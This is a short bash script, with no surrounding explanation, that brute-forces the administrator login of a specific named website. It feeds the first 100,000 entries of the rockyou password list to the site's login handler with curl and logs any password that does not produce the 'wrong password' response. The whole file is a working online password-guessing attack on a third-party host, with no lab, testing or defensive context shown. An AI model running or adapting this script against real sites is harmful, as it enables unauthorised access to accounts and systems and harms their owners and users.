#!/bin/bash
head -100000 /tmp/rockyou.txt | while read pass; do
  result=$(curl -s --max-time 2 "http://bjhzsv.com/main/a7chkuser.asp" -d "t1=admin&t2=$pass&t3=0000" 2>/dev/null)
  if ! echo "$result" | iconv -f gb2312 -t utf-8 2>/dev/null | grep -q "密码错误"; then
    echo "FOUND PASSWORD: $pass" >> /tmp/admin_password_found.txt
    echo "$result" >> /tmp/admin_password_found.txt
    break
  fi
done 2>/dev/null
echo "Done trying first 100000 passwords" >> /tmp/admin_password_status.txt
